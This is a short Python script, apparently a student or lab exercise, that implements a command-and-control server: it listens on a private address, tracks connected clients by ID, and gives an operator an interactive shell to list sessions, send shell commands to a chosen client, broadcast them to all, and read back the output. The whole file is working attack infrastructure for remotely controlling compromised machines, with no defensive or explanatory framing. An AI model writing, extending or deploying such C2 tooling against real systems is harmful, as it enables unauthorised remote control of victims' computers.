# Matt Sisco - C2 Server Script
import socket
import time
import threading
import sys

# store client connections and their IDs
clients = {}
client_id = 0 
lock = threading.Lock()

def handle_client(client_socket, client_addr, cid):
    print(f"Client {cid} connected from {client_addr}")
    clients[cid] = client_socket

    try:
        while True:
            # receive response/output from client
            response = client_socket.recv(1024).decode()
            if not response:
                break
            
            print(f"\n[Client {cid}] Output:\n{response}")
    except Exception as e:
        print(f"Error with client {cid}: {e}")
    finally:
        print(f"Client {cid} disconnected")
        with lock:
            del clients[cid]
        client_socket.close()

def broadcast_command(cmd):
    # Add functionality to send a command to all connected clients
    with lock:
        for cid, client_socket in clients.items():
            try:
                print(f"Sending command to client {cid}: {cmd}")
                client_socket.sendall(cmd.encode('utf-8'))
            except Exception as e:
                print(f"Error sending to client {cid}: {e}")

def send_command_to_client(cid, cmd):
    # Add functionality to send a command to a specific client by ID
    with lock:
        client_socket = clients.get(cid)
        if client_socket:
            try:
                print(f"Sending command to client {cid}: {cmd}")
                client_socket.sendall(cmd.encode('utf-8'))
            except Exception as e:
                print(f"Error sending to client {cid}: {e}")
        else:
            print(f"No client with ID {cid}")

def list_sessions():
    # Add functionality to list all active client sessions with their IDs
    with lock:
        if clients:
            print("Active sessions:")
            for cid in clients.keys():
                print(f"Client ID: {cid}")
        else:
            print("No active sessions.")

def server_shell():
    # Add an interactive shell for the operator to manage sessions and send commands
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            list_sessions()
        elif cmd.startswith("send "):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(f"\nEnter command to send to client {cid}:")
                    while True:
                        sub_cmd = input(f"Client {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"No client with ID {cid}")
            except (ValueError, IndexError):
                print("Invalid command format. Use 'send <client_id> <command>'")

        elif cmd.startswith("broadcast "):
            # Extract the command to broadcast
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("Usage: broadcast <command>")
        elif cmd in ["exit", "quit"]:
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            sys.exit(0)
            print("Shutting down server...")
            break
        else:
            print("Unknown command. Use 'list', 'send <client_id> <command>', 'broadcast <command>', or 'exit'.")

def main():
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("192.168.10.13", 9999))
    server.listen(5)
    print("Server listening on 192.168.10.13:9999")
    
    # Start accept thread
    def accept_connections():
        global client_id
        try:
            while True:
                # Accept new client connections
                client_socket, client_addr = server.accept()
                with lock:
                    client_id += 1
                    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_addr, client_id))
                    client_thread.daemon = True
                    client_thread.start()
        except KeyboardInterrupt:
            pass
    
    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()
    
    # Run the interactive shell in main thread
    try:
        server_shell()
    except KeyboardInterrupt:
        print("Shutting down server...")
    finally:
        server.close()

if __name__ == "__main__":    
    main()